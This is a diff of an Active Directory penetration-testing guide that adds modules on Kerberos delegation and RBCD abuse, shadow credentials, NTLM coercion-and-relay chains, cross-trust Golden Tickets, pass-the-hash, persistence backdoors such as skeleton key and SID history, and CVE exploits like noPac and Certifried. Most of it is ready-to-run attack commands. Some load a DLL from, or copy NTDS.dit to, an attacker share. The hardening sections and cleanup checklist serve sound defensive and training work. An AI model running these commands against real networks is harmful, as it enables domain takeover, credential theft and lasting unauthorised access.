+| ESC6 | CA: EDITF_ATTRIBUTESUBJECTALTNAME2 enabled | SAN in any request |
+| ESC7 | CA: Low-priv has ManageCA or ManageCertificates | Approve/issue arbitrary certs |
+| ESC8 | CA: HTTP enrollment without EPA | NTLM relay → cert |
+| ESC9 | Template: No security extension + StrongMapping off | Impersonation via SAN |
+| ESC10 | Registry: StrongCertificateBindingEnforcement = 0 | UPN spoofing |
+| ESC11 | CA: RPC enrollment without encryption | NTLM relay → cert (RPC) |
+| ESC13 | Template: Issuance policy OID group link | Effective group membership |
+| ESC14 | Template: Weak explicit mappings | Authentication as mapped user |
+| ESC15 | Template: Application Policy in schema v1 | Similar to ESC13 |
+| ESC16 | CA: Missing security extension (CA-wide) | Like ESC9 but global |
+
+### Hardening
+
+- Disable `ENROLLEE_SUPPLIES_SUBJECT` unless explicitly needed.
+- Restrict enrollment to specific security groups (never Domain Users).
+- Require manager approval on sensitive templates.
+- Enable EPA on AD CS IIS endpoints.
+- Enable `IF_ENFORCEENCRYPTICERTREQUEST` on RPC.
+- Remove `EDITF_ATTRIBUTESUBJECTALTNAME2` from CA.
+- Audit certificate issuance logs (Event ID 4887).
+- Use Certipy `find -vulnerable` regularly to audit.
+
+## Module 9: Delegation Attacks & RBCD
+
+*Abuse Kerberos delegation to impersonate users across services.*
+
+### Key Concepts
+
+**Unconstrained Delegation** — A machine trusted to delegate ANY user's TGT to ANY service. If you compromise this machine, you get every TGT that authenticates to it (including DAs). Identified by `TRUSTED_FOR_DELEGATION` flag (UAC bit 524288).
+
+**Constrained Delegation** — A machine or service can only delegate to specific SPNs listed in `msDS-AllowedToDelegateTo`. Uses S4U2Self + S4U2Proxy protocol extensions.
+
+**Resource-Based Constrained Delegation (RBCD)** — The target service controls who can delegate TO it via `msDS-AllowedToActOnBehalfOfOtherIdentity`. Unlike constrained delegation, this can be configured by any account with write access to the target computer object.
+
+**S4U2Self** — Service requests a TGS for a user to itself (without the user's credentials).
+
+**S4U2Proxy** — Service uses S4U2Self ticket + its own TGT to request a TGS to a downstream service on behalf of the user.
+
+### 1. Find Delegation
+
+**Unconstrained delegation hosts:**
+
+```
+# LDAP
+ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" \
+  "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
+  sAMAccountName
+
+# PowerShell
+Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
+```
+
+**Constrained delegation hosts:**
+
+```
+# LDAP
+ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" \
+  "(&(objectCategory=computer)(msDS-AllowedToDelegateTo=*))" \
+  sAMAccountName msDS-AllowedToDelegateTo
+
+# PowerShell
+Get-ADComputer -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo
+```
+
+**RBCD configured hosts:**
+
+```
+Get-ADComputer -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -like "*"} -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
+```
+
+### 2. Unconstrained Delegation Exploitation
+
+If you have local admin on an unconstrained delegation host, dump cached TGTs:
+
+```
+# Mimikatz — extract all cached tickets
+privilege::debug
+sekurlsa::tickets /export
+
+# Rubeus — monitor for incoming TGTs
+Rubeus.exe monitor /interval:5 /nowrap
+```
+
+**Printer Bug + Unconstrained Delegation** — Force the DC to authenticate to the unconstrained host:
+
+```
+# From any domain user, trigger PrinterBug targeting the DC
+SpoolSample.exe DC01.corp.local UNCONSTRAINED-HOST.corp.local
+
+# On the unconstrained host, Rubeus captures DC01$'s TGT
+Rubeus.exe monitor /interval:5 /targetuser:DC01$ /nowrap
+
+# Use captured TGT for DCSync
+Rubeus.exe ptt /ticket:<base64_tgt>
+mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt"
+```
+
+### 3. Constrained Delegation Exploitation
+
+If you compromise an account with constrained delegation, use S4U to impersonate any user to the allowed services.
+
+**Rubeus (Windows):**
+
+```
+# If you have the account's hash
+Rubeus.exe s4u /user:svc_web$ /rc4:<hash> /impersonateuser:Administrator \
+  /msdsspn:CIFS/dc1.corp.local /ptt
+
+# If you have the account's AES key
+Rubeus.exe s4u /user:svc_web$ /aes256:<key> /impersonateuser:Administrator \
+  /msdsspn:HTTP/dc1.corp.local /altservice:CIFS /ptt
+```
+
+**Impacket (Linux):**
+
+```
+impacket-getST -spn CIFS/dc1.corp.local -impersonate Administrator \
+  -dc-ip 10.0.0.1 corp.local/svc_web$:'password'
+export KRB5CCNAME=Administrator@CIFS_dc1.corp.local@CORP.LOCAL.ccache
+impacket-smbclient -k -no-pass dc1.corp.local
+```
+
+Note: The `/altservice` flag in Rubeus allows you to modify the SPN in the ticket — e.g., change HTTP to CIFS — because the service name in the ticket is not encrypted.
+
+### 4. RBCD (Resource-Based Constrained Delegation)
+
+RBCD is one of the most versatile AD attacks. You need:
+1. Write access to a computer object's `msDS-AllowedToActOnBehalfOfOtherIdentity`.
+2. An account with an SPN (either an existing machine account or one you create).
+
+**Step 1: Create a machine account (if MachineAccountQuota > 0):**
+
+```
+impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'FakePass123' \
+  -dc-ip 10.0.0.1 corp.local/user1:'Pass123'
+```
+
+Check MachineAccountQuota first:
+
+```
+ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" \
+  "(objectClass=domain)" ms-DS-MachineAccountQuota
+```
+
+Default is 10 — any domain user can create up to 10 machine accounts.
+
+**Step 2: Set RBCD on the target computer:**
+
+```
+# Impacket
+impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'TARGET-SRV$' -action write \
+  -dc-ip 10.0.0.1 corp.local/user1:'Pass123'
+
+# PowerShell
+Set-ADComputer -Identity "TARGET-SRV" -PrincipalsAllowedToDelegateToAccount FAKE01$
+```
+
+**Step 3: S4U to impersonate Administrator on target:**
+
+```
+impacket-getST -spn CIFS/target-srv.corp.local -impersonate Administrator \
+  -dc-ip 10.0.0.1 corp.local/'FAKE01$':'FakePass123'
+
+export KRB5CCNAME=Administrator@CIFS_target-srv.corp.local@CORP.LOCAL.ccache
+impacket-psexec -k -no-pass target-srv.corp.local
+```
+
+**Common RBCD scenarios:**
+- GenericWrite on a computer object → set RBCD → impersonate admin on that computer.
+- Relay NTLM auth to LDAP → write RBCD on the relayed computer → impersonate admin.
+- Combine with NTLM coercion for remote exploitation without initial access.
+
+### Hardening
+
+- Remove unconstrained delegation from all non-DC machines (DCs are unconstrained by default and cannot be changed).
+- Set `MachineAccountQuota` to 0.
+- Use Protected Users group (prevents delegation for members).
+- Monitor Event IDs: 4768/4769 with delegation flags.
+- Audit `msDS-AllowedToActOnBehalfOfOtherIdentity` changes.
+
+## Module 10: Shadow Credentials & Coercion Chains
+
+*Abuse msDS-KeyCredentialLink for account takeover, and chain coercion with relay for remote domain compromise.*
+
+### Shadow Credentials
+
+**What it is:** AD supports Windows Hello for Business (WHfB) key-based authentication. The public key is stored in `msDS-KeyCredentialLink`. If you can write to this attribute on a target, you can add your own key pair and authenticate as that account via PKINIT — without knowing or changing their password.
+
+**Why it matters:** Less disruptive than password reset. Works on both user and computer objects. Persists until the key is removed.
+
+**Prerequisites:** Domain Functional Level 2016+, at least one DC running Server 2016+, AD CS or equivalent PKI.
+
+### 1. Shadow Credentials Attack
+
+**Whisker (Windows):**
+
+```
+# Add shadow credential to target
+Whisker.exe add /target:svc_admin /domain:corp.local /dc:dc1.corp.local
+
+# Whisker outputs a Rubeus command — run it to get TGT + NT hash
+Rubeus.exe asktgt /user:svc_admin /certificate:<base64_cert> /password:<password> /domain:corp.local /dc:dc1.corp.local /getcredentials /show /nowrap
+```
+
+**pyWhisker (Linux):**
+
+```
+# Add shadow credential
+python3 pywhisker.py -d corp.local -u user1 -p 'Pass123' --target svc_admin --action add --filename svc_admin_cert
+
+# Get TGT using PKINITtools
+python3 gettgtpkinit.py -cert-pfx svc_admin_cert.pfx -pfx-pass <password> corp.local/svc_admin svc_admin.ccache
+
+# Extract NT hash from TGT
+export KRB5CCNAME=svc_admin.ccache
+python3 getnthash.py -key <AS-REP_key> corp.local/svc_admin
+```
+
+**Cleanup (important):**
+
+```
+# List existing credentials
+Whisker.exe list /target:svc_admin
+python3 pywhisker.py -d corp.local -u user1 -p 'Pass123' --target svc_admin --action list
+
+# Remove by DeviceID
+Whisker.exe remove /target:svc_admin /deviceid:<GUID>
+python3 pywhisker.py -d corp.local -u user1 -p 'Pass123' --target svc_admin --action remove --device-id <GUID>
+```
+
+### 2. Shadow Credentials via NTLM Relay
+
+Computer objects can write their own `msDS-KeyCredentialLink`. So if you relay a machine's NTLM auth to LDAP, you can add shadow credentials for that machine.
+
+```
+# Terminal 1: Relay to LDAP with shadow credentials
+impacket-ntlmrelayx -t ldap://dc1.corp.local --shadow-credentials --shadow-target 'DC01$'
+
+# Terminal 2: Coerce DC to authenticate
+python3 PetitPotam.py attacker_ip dc1.corp.local
+
+# Terminal 1 output: PFX file for DC01$
+# Authenticate
+certipy auth -pfx DC01.pfx -dc-ip 10.0.0.1
+# Now you have DC01$'s NT hash → DCSync
+impacket-secretsdump -just-dc -hashes :dc01_hash corp.local/'DC01$'@dc1.corp.local
+```
+
+### 3. Full Coercion + Relay Attack Chains
+
+These chains combine coercion (force authentication) with relay (forward auth) for domain compromise from a low-priv user with network access.
+
+**Chain A: Coerce + Relay to LDAP + RBCD**
+
+```
+# 1. Start relay targeting LDAP, configure RBCD
+impacket-ntlmrelayx -t ldap://dc2.corp.local --delegate-access --escalate-user attacker_user
+
+# 2. Coerce DC01 to authenticate to us
+python3 PetitPotam.py attacker_ip dc1.corp.local
+
+# 3. Relay creates machine account + sets RBCD on DC01$
+# 4. S4U impersonation
+impacket-getST -spn CIFS/dc1.corp.local -impersonate Administrator corp.local/'RELAY_MACHINE$':'password'
+```
+
+**Chain B: Coerce + Relay to AD CS (ESC8)**
+
+```
+# 1. Start relay to AD CS web enrollment
+impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp --adcs --template DomainController
+
+# 2. Coerce DC
+python3 PetitPotam.py attacker_ip dc1.corp.local
+
+# 3. Get certificate → authenticate → DCSync
+certipy auth -pfx dc01.pfx -dc-ip 10.0.0.1
+impacket-secretsdump -just-dc -hashes :dc01_hash corp.local/'DC01$'@dc1.corp.local
+```
+
+**Chain C: Coerce + Relay to LDAP + Shadow Credentials**
+
+```
+# 1. Start relay with shadow credentials
+impacket-ntlmrelayx -t ldap://dc2.corp.local --shadow-credentials --shadow-target 'DC01$'
+
+# 2. Coerce DC01
+python3 PetitPotam.py attacker_ip dc1.corp.local
+
+# 3. Use PFX to get hash → DCSync
+```
+
+### Requirements Summary
+
+| Chain | Requires | Targets |
+|-------|----------|---------|
+| Coerce + RBCD | LDAP signing disabled, MAQ > 0 | Any computer |
+| Coerce + ESC8 | AD CS web enrollment over HTTP | DC or any machine |
+| Coerce + Shadow Creds | LDAP signing disabled, DFL 2016+ | Any computer/user |
+
+### Hardening
+
+- Enforce LDAP signing and channel binding on all DCs.
+- Enable EPA on AD CS web enrollment (or remove it entirely).
+- Set `MachineAccountQuota` to 0.
+- Monitor `msDS-KeyCredentialLink` attribute changes.
+- Disable Print Spooler on DCs.
+- Apply patches for PetitPotam and other coercion CVEs.
+
+## Module 11: Domain Trust & Forest Attacks
+
+*Pivot across trust boundaries to compromise additional domains and forests.*
+
+### Key Concepts
+
+**Domain Trust** — A link allowing users in one domain to access resources in another. Can be one-way or two-way.
+
+**Trust Direction:**
+- **Outbound (trusting):** "I trust THEM" — users from the trusted domain can access my resources.
+- **Inbound (trusted):** "THEY trust ME" — my users can access their resources.
+- **Bidirectional:** Both directions.
+
+**Forest Trust** — Trust between separate AD forests. Cross-forest authentication.
+
+**SID Filtering** — Protection that strips foreign SIDs from tokens at trust boundaries. Prevents Golden Ticket attacks across forests. Enabled by default on external trusts; disabled within the same forest.
+
+**SID History** — Attribute preserving old SIDs after domain migration. If SID filtering is disabled, SID history can be abused to inject high-privilege SIDs.
+
+### 1. Enumerate Trusts
+
 ```powershell
-$templates = Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Filter * -Properties msPKI-EnrollmentFlag,distinguishedName
-foreach ($t in $templates) {
-    Write-Host "`nTemplate: $($t.Name)"
-    $acl = Get-Acl ("AD:" + $t.distinguishedName)
-    $acl.Access | Where-Object { $_.ActiveDirectoryRights -match "Enroll" } | Format-Table IdentityReference,ActiveDirectoryRights,InheritanceType
-}
-```
-**Expected Output**:  
-```
-Template: Kerberos Authentication
-IdentityReference        ActiveDirectoryRights ObjectType   InheritanceType
-CORP\Domain Admins       GenericAll            (GUID)       Descendents,This Object
-BUILTIN\Administrators   GenericAll            (GUID)       Descendents,This Object
+# PowerShell
+Get-ADTrust -Filter * | Select Name, TrustType, Direction, ForestTransitive, SIDFilteringQuarantined
 
-Template: DomainController
-IdentityReference        ActiveDirectoryRights ObjectType   InheritanceType
-CORP\Domain Admins       GenericAll            (GUID)       Descendents,This Object
+# nltest
+nltest /domain_trusts /all_trusts
 
-Template: Computer
-IdentityReference        ActiveDirectoryRights ObjectType   InheritanceType
-CORP\Domain Users        ReadProperty,Enroll    (GUID)       Descendents,This Object
-CORP\HelpdeskOps         Enroll                 (GUID)       Descendents,This Object
-
-Template: User
-IdentityReference        ActiveDirectoryRights ObjectType   InheritanceType
-AUTHENTICATED USERS      ReadProperty,Enroll    (GUID)       Descendents,This Object
-
-Template: AuditAgent
-IdentityReference        ActiveDirectoryRights ObjectType   InheritanceType
-CORP\AuditGroup          Enroll                 (GUID)       Descendents,This Object
+# LDAP
+ldapsearch -x -H ldap://DC01.corp.local -b "CN=System,DC=corp,DC=local" \
+  "(objectClass=trustedDomain)" cn trustDirection trustType securityIdentifier
 ```
 
-### Exploit Scenarios  
+Trust direction values: 1 = Inbound, 2 = Outbound, 3 = Bidirectional.
 
-#### Scenario A: Safe Templates  
-- AD CS restricted to DA only → skip AD CS attack.
+### 2. Child → Parent Domain Escalation
 
-#### Scenario B: “Computer” Template Enrollable by Domain Users  
-- Request a computer certificate and use PKINIT to impersonate machine.  
+Within the same forest, SID filtering is NOT enforced between parent and child domains. This means you can forge a Golden Ticket with the Enterprise Admins SID from a child domain.
 
-#### Scenario C: Custom “AuditAgent” Template with Enrollment Agent Rights  
-- As `AuditGroup`, request Enrollment Agent certificate.  
-- Use it to enroll for DA certificate via CA (ESC6).
+**Prerequisite:** `krbtgt` hash of the child domain.
 
-### Shadow Credentials & Certificate-Based Attacks
+```
+# Get Enterprise Admins SID (from parent domain)
+# Format: <ForestRootDomainSID>-519
 
-_Use certificates and keys outside normal user objects for stealth._
+# Forge Golden Ticket with EA SID in ExtraSids
+impacket-ticketer -nthash <child_krbtgt_hash> -domain child.corp.local \
+  -domain-sid S-1-5-21-CHILD... -extra-sid S-1-5-21-PARENT...-519 Administrator
 
-#### Tools & Commands
+# Or via Mimikatz
+kerberos::golden /user:Administrator /domain:child.corp.local \
+  /sid:S-1-5-21-CHILD... /sids:S-1-5-21-PARENT...-519 \
+  /krbtgt:<child_krbtgt_hash> /ptt
+```
 
--   **Certify** (BloodHound plugin)
-    
-    ```powershell
-    # Enumerate vulnerable templates
-    Import-Module .\Certify.psm1
-    Get-CertificateTemplate | Where-Object { $_.AutoEnroll -eq $true }
-    
-    ```
-    
-    _Expected Output Snippet:_ Lists templates with Autoenroll for Authenticated Users.
-    
--   **ADCSploit**
-    
-    ```bash
-    # Request a certificate for persistence
-    python3 adcsploit.py --template User --domain lab.local --dc dc1.lab.local
-    
-    ```
-    
-    _Expected Output:_ `Certificate issued: user.pfx`
-    
+Now you have Enterprise Admin rights across the entire forest.
 
+**Using trust keys (inter-realm TGT):**
 
+```
+# Dump trust key
+mimikatz.exe "lsadump::dcsync /domain:child.corp.local /user:child$"
 
-### Expected Result
+# Forge inter-realm TGT
+kerberos::golden /user:Administrator /domain:child.corp.local \
+  /sid:S-1-5-21-CHILD... /sids:S-1-5-21-PARENT...-519 \
+  /rc4:<trust_key> /service:krbtgt /target:corp.local /ptt
+```
 
--   Exploitable vulnerabilities identified and leveraged for high-privilege access.
-    
--   Misconfigured AD objects discovered and abused for persistence.
-    
--   Golden/Silver tickets loaded, granting long-term access.
-    
--   Rogue certificates/keys created for stealth authentication.
-    
+### 3. Cross-Forest Trust Abuse
 
+Cross-forest trusts have SID filtering enabled by default, so you cannot inject arbitrary SIDs. However:
 
+**Access shared resources:** If the external forest has granted access to your domain users, use those access rights.
 
-### Mitigation & Hardening
+```
+# Enumerate resources accessible across the trust
+Get-DomainObject -Domain partner.local -LDAPFilter "(objectCategory=group)" -Properties cn, member |
+  Where-Object { $_.member -match "corp.local" }
+```
 
--   Apply patches for known vulnerabilities immediately.
-    
--   Regularly audit and clean stale objects and trusts.
-    
--   Rotate KRBTGT account password twice for golden ticket invalidation.
-    
--   Restrict autoenroll and enforce approval workflows for certificate templates.
-    
+**Kerberoast across trust boundaries:**
 
+```
+impacket-GetUserSPNs -target-domain partner.local -dc-ip partner_dc_ip corp.local/user1:'Pass123'
+```
 
+**If SID filtering is disabled (misconfiguration):**
 
-### Next Steps
+```
+# Forge ticket with partner domain's DA SID
+impacket-ticketer -nthash <trust_key> -domain corp.local \
+  -domain-sid S-1-5-21-CORP... -extra-sid S-1-5-21-PARTNER...-512 \
+  -spn krbtgt/partner.local Administrator
+```
 
--   Use Golden/Silver tickets to move laterally and maintain persistence.
-    
--   Clean up shadow credentials and revoke compromised certificates.
-    
--   Monitor for unusual certificate issuance events in AD CS logs.
-    
+### Hardening
 
-### Common Pitfalls  
-- Misreading `msPKI-EnrollmentFlag`.  
-- Missing EKU that allows PKINIT.  
-- Overlooking custom templates.
-- - - 
-## <a name="module-15"></a> Module 15: Miscellaneous Misconfigurations
+- Enable SID filtering on ALL external trusts (default, but verify).
+- Use selective authentication on trusts.
+- Audit cross-forest access permissions.
+- Monitor Event ID 4769 for cross-domain TGS requests.
+- Minimize inter-forest trust relationships.
 
-#### 1. Bleeding-Edge Vulnerabilities
+## Module 12: Lateral Movement & Privilege Escalation
 
-_Leverage zero-day or newly patched weaknesses in AD protocols or services._
+*Pivot across hosts using credential material and remote execution tools.*
 
-#### Tools & Commands
+### 1. Pass-the-Hash (PtH)
 
--   **CVE-2020-1472 (ZeroLogon) PoC**
-    
-    ```bash
-    # Run ZeroLogon exploit to obtain machine account password
-    python3 ZeroLogon.py dc1.lab.local
-    
-    ```
-    
-    _Expected Output:_ `SUCCESS: Exploit complete, authenticated as DC$ account!`
-    
--   **PrintSpoofer**
-    
-    ```powershell
-    Import-Module .\PrintSpoofer.ps1
-    Invoke-PrintSpoofer -DC dc1.lab.local
-    
-    ```
-    
-    _Expected Output:_ `Hash captured: DC$::DOMAIN:010100...`
-    
+Authenticate using NTLM hash without the plaintext password.
 
-_Find and abuse stale or misconfigured AD objects._
+```
+# Impacket
+impacket-psexec -hashes :aad3b435b51404ee:1122334455aabbcc corp.local/administrator@10.0.0.20
+impacket-wmiexec -hashes :1122334455aabbcc corp.local/administrator@10.0.0.20
+impacket-smbexec -hashes :1122334455aabbcc corp.local/administrator@10.0.0.20
 
-#### Tools & Commands
+# NetExec (verify access first)
+nxc smb 10.0.0.20 -u administrator -H 1122334455aabbcc
 
--   **BloodHound**
-    
-    ```bash
-    SharpHound.exe --CollectionMethod All
-    
-    ```
-    
-    _Expected Output Files:_ `objects.json`, `acls.json`, highlighting stale trusts and orphaned accounts.
-    
--   **PowerView**
-    
-    ```powershell
-    # Find stale computer accounts not changed in 90 days
-    Get-ADComputer -Filter {LastLogonTimestamp -lt (Get-Date).AddDays(-90)} | Select Name,LastLogonTimestamp
-    
-    ```
-    
-    _Expected Output Snippet:_ Lists old computer accounts to target.
-    
+# Mimikatz
+sekurlsa::pth /user:administrator /domain:corp.local /ntlm:1122334455aabbcc /run:powershell.exe
 
----
+# evil-winrm
+evil-winrm -i 10.0.0.20 -u administrator -H 1122334455aabbcc
+```
 
-## <a name="module-16"></a> Module 16: Lateral Movement & Privilege Escalation
+### 2. Pass-the-Ticket (PtT)
 
-### Introduction  
-Pivot across hosts using PtH/PtT, WinRM, PSExec, etc., and escalate local privileges to further domain compromise.
+Inject Kerberos tickets into your session.
 
-### Definitions  
-1. **PtH (Pass-the-Hash)**: Use NTLM hash to authenticate without password.  
-2. **PtT (Pass-the-Ticket)**: Inject Kerberos tickets into session.  
-3. **Over-Pass the Hash**: Use NTLM hash in Kerberos flow (AS-REP).  
-4. **WinRM**: Windows Remote Management protocol (PowerShell Remoting).  
-5. **PSExec**: Tool for remote command execution.  
-6. **DCOM**: Distributed COM for remote execution.  
+```
+# Export tickets (Mimikatz)
+sekurlsa::tickets /export
 
-### Why It Matters  
-- Move to critical servers (file servers, AD CS, etc.) and escalate to DA if not yet.
+# Import ticket
+kerberos::ptt ticket.kirbi
 
-### Tools & Commands  
+# Linux
+export KRB5CCNAME=/path/to/ticket.ccache
+impacket-psexec -k -no-pass corp.local/administrator@dc1.corp.local
+```
 
-#### PtH (Mimikatz)  
+### 3. Over-Pass-the-Hash
+
+Use NTLM hash to request a Kerberos TGT, then use Kerberos authentication (avoids NTLM-based detections).
+
+```
+# Rubeus
+Rubeus.exe asktgt /user:administrator /rc4:1122334455aabbcc /domain:corp.local /ptt
+
+# Impacket
+impacket-getTGT -hashes :1122334455aabbcc corp.local/administrator
+export KRB5CCNAME=administrator.ccache
+```
+
+### 4. Remote Execution Methods
+
+| Method | Port | Requires | Noise Level |
+|--------|------|----------|-------------|
+| PSExec | 445 | Admin share + service creation | High |
+| WMIExec | 135 | WMI access | Medium |
+| SMBExec | 445 | Admin share | Medium |
+| WinRM | 5985/5986 | Remote Management enabled | Low |
+| DCOM | 135 | DCOM enabled | Low |
+| AtExec | 445 | Task Scheduler | Medium |
+
+```
+# WinRM (PowerShell Remoting)
+Enter-PSSession -ComputerName SRV01.corp.local -Credential corp\administrator
+
+# evil-winrm (from Linux)
+evil-winrm -i SRV01.corp.local -u administrator -p 'P@ssw0rd!'
+
+# DCOM
+impacket-dcomexec corp.local/administrator:'P@ssw0rd!'@10.0.0.20
+
+# AtExec (scheduled task)
+impacket-atexec corp.local/administrator:'P@ssw0rd!'@10.0.0.20 "whoami"
+```
+
+### 5. Credential Extraction on Compromised Hosts
+
+```
+# Mimikatz — dump logon passwords
+privilege::debug
+sekurlsa::logonpasswords
+
+# Mimikatz — dump cached domain creds
+lsadump::cache
+
+# LSASS dump (from remote via NetExec)
+nxc smb 10.0.0.20 -u admin -p 'P@ss!' --lsa
+nxc smb 10.0.0.20 -u admin -p 'P@ss!' -M nanodump
+nxc smb 10.0.0.20 -u admin -p 'P@ss!' -M lsassy
+
+# SAM dump
+nxc smb 10.0.0.20 -u admin -p 'P@ss!' --sam
+
+# DPAPI secrets
+mimikatz.exe "dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\*"
+```
+
+### 6. Local Privilege Escalation
+
+**PrintSpoofer / GodPotato / JuicyPotatoNG** — Escalate from service account to SYSTEM:
+
+```
+# PrintSpoofer (SeImpersonatePrivilege required)
+PrintSpoofer.exe -i -c "cmd /c whoami"
+
+# GodPotato (works on Server 2022+)
+GodPotato.exe -cmd "cmd /c whoami"
+```
+
+**Token impersonation with Incognito:**
+
+```
+# Mimikatz
+token::elevate
+token::list
+token::impersonate /user:corp\administrator
+```
+
+### Hardening
+
+- Disable local admin password reuse across machines.
+- Deploy LAPS for unique local admin passwords.
+- Enable Credential Guard (prevents Mimikatz from reading LSASS).
+- Add privileged accounts to Protected Users group.
+- Disable WDigest authentication.
+- Monitor for lateral movement: Event IDs 4624 (logon type 3/10), 4648 (explicit creds).
+
+## Module 13: Persistence & Cleanup
+
+*Maintain access and cover tracks after achieving DA.*
+
+### 1. Golden Ticket Persistence
+
+Already covered in Module 6. Key point: lasts until `krbtgt` password is rotated twice.
+
+### 2. Silver Ticket Persistence
+
+Forge TGS for specific services. Lasts until the service account password changes.
+
+### 3. AdminSDHolder Backdoor
+
+Already covered in Module 7. SDProp runs every 60 minutes and propagates your ACE to all protected groups.
+
+### 4. GPO Backdoor
+
+Create or modify a GPO to execute a payload on domain-joined machines.
+
 ```powershell
-mimikatz.exe 'sekurlsa::pth /user:corp\jsmith /domain:corp.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:powershell.exe'
-```
-- Then connect remote:  
-  ```powershell
-  Enter-PSSession -ComputerName WS002 -Credential corp\jsmith
-  ```
+# Create scheduled task via GPO (PowerShell)
+New-GPO -Name "Maintenance" | New-GPLink -Target "OU=Servers,DC=corp,DC=local"
 
-#### PtT (Mimikatz)  
+# Add logon script
+Set-GPRegistryValue -Name "Maintenance" \
+  -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup\0" \
+  -ValueName "Script" -Type String -Value "\\dc1\sysvol\corp.local\scripts\update.ps1"
+```
+
+### 5. Certificate-Based Persistence
+
+Certificates persist through password changes. If you obtained a cert via ESC1 or other AD CS abuse, it remains valid until expiration.
+
+```
+# Request a long-lived certificate
+certipy req -u administrator@corp.local -p 'P@ss!' -target ca.corp.local \
+  -ca 'CORP-CA' -template User
+
+# Authenticate anytime (even after password change)
+certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
+```
+
+### 6. Shadow Credentials Persistence
+
+Add a key credential to a privileged account — persists through password changes.
+
+```
+Whisker.exe add /target:administrator /domain:corp.local
+```
+
+### 7. SID History Injection
+
+If you have DCSync/replication rights, inject Enterprise Admin SID into a normal user's SID history.
+
+```
+# Mimikatz
+sid::add /sam:backdoor_user /new:S-1-5-21-...-519
+```
+
+### 8. Skeleton Key
+
+Patch LSASS on the DC to accept a master password for any account. Does not survive DC reboot.
+
+```
+mimikatz.exe "misc::skeleton"
+# Now "mimikatz" works as password for any account
+```
+
+### 9. Cleanup Checklist
+
+After the engagement, clean up all persistence:
+
+- Remove added AD group memberships.
+- Remove ACEs added to AdminSDHolder or domain root.
+- Remove shadow credentials (Whisker remove).
+- Delete created machine accounts.
+- Remove RBCD configurations.
+- Revert modified GPOs.
+- Revoke any issued certificates.
+- Remove created user accounts.
+- Clear Kerberos ticket caches.
+- Document everything cleaned up in the report.
+
+## Module 14: Miscellaneous Misconfigurations
+
+*Additional common findings and modern attack vectors.*
+
+### 1. MachineAccountQuota Abuse
+
+Default: any domain user can create up to 10 machine accounts. This enables RBCD attacks (Module 9).
+
+```
+# Check quota
+ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" \
+  "(objectClass=domain)" ms-DS-MachineAccountQuota
+```
+
+**Fix:** Set `ms-DS-MachineAccountQuota` to 0.
+
+### 2. Stale Computer Accounts
+
+Machines not logged in for 90+ days may have weak/unchanged passwords.
+
 ```powershell
-mimikatz.exe 'kerberos::ptt TGT.kirbi'
+$threshold = (Get-Date).AddDays(-90)
+Get-ADComputer -Filter {LastLogonTimestamp -lt $threshold} -Properties LastLogonTimestamp, OperatingSystem |
+  Select Name, OperatingSystem, @{N='LastLogon';E={[DateTime]::FromFileTime($_.LastLogonTimestamp)}}
 ```
-- Check:  
-  ```powershell
-  klist
-  ```
-- Then SMB:  
-  ```powershell
-  net use \\WS002\C$ 
-  ```
 
-#### Over-Pass the Hash (Rubeus)  
+### 3. DnsAdmins Privilege Escalation
+
+Members of the DnsAdmins group can load arbitrary DLLs into the DNS service (runs as SYSTEM on the DC).
+
+```
+# Set malicious DLL
+dnscmd dc1.corp.local /config /serverlevelplugindll \\attacker\share\evil.dll
+
+# Restart DNS service
+sc \\dc1.corp.local stop dns
+sc \\dc1.corp.local start dns
+```
+
+### 4. Backup Operators Abuse
+
+Members can back up files including the AD database.
+
+```
+# Backup NTDS.dit
+wbadmin start backup -backuptarget:\\attacker\share -include:C:\Windows\NTDS\ntds.dit -quiet
+
+# Or use diskshadow + robocopy to extract
+```
+
+### 5. noPac / sAMAccountName Spoofing (CVE-2021-42278 + CVE-2021-42287)
+
+Create a machine account, rename it to match the DC's sAMAccountName (without the $), request a TGT, rename back, then request a service ticket — KDC issues it for the DC.
+
+```
+# Using noPac.py
+python3 noPac.py corp.local/user1:'Pass123' -dc-ip dc1.corp.local -dc-host dc1 --impersonate administrator -dump
+```
+
+**Status:** Patched November 2021. Check if KB5008602 and KB5008380 are installed.
+
+### 6. Certifried (CVE-2022-26923)
+
+Any domain user can create a machine account and set its dNSHostName to match a DC, then request a certificate that authenticates as the DC.
+
+```
+certipy account create -u user1@corp.local -p 'Pass123' -user 'EVIL$' -dns dc1.corp.local
+certipy req -u 'EVIL$@corp.local' -p 'EvilPass' -target ca.corp.local -ca 'CORP-CA' -template Machine
+certipy auth -pfx dc1.pfx -dc-ip 10.0.0.1
+```
+
+**Status:** Patched May 2022. Check if KB5014754 is installed.
+
+### 7. GPO Misconfigurations
+
 ```powershell
-Rubeus.exe asktgt /user:corp\jsmith /aes256:HASH /domain:corp.local /dc:DC01.corp.local /ptt
+# Export all GPOs to HTML for review
+Import-Module GroupPolicy
+Get-GPOReport -All -ReportType HTML -Path AllGPOs.html
 ```
 
-#### Remote Execution  
+Common issues to look for:
+- "Allow log on locally" granted to Everyone or Domain Users.
+- Unrestricted PowerShell execution policy.
+- Unencrypted GPP (Group Policy Preferences) passwords (legacy but still found).
+- Weak User Rights Assignments.
 
-- **WinRM**:  
-  ```powershell
-  Enable-PSRemoting -Force
-  Enter-PSSession -ComputerName WS002.corp.local -Credential corp\jsmith
-  ```
-- **PSExec**:  
-  ```powershell
-  psexec \\WS002.corp.local -u corp\jsmith -p 'Password123' cmd.exe
-  ```
-- **DCOM (Impacket)**:  
